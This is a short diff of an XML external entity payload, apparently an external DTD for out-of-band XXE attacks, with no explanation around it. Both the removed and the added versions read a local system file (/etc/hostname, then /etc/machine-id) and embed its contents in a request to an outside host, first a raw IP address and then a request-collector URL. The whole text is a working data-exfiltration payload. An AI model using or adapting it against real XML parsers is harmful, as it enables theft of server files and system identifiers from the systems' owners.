@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://81.207.37.179/?%file;'>">
+<!ENTITY % file SYSTEM "file:///etc/machine-id">
+<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://en8br1h7vdr8c.x.pipedream.net/?%file;'>">
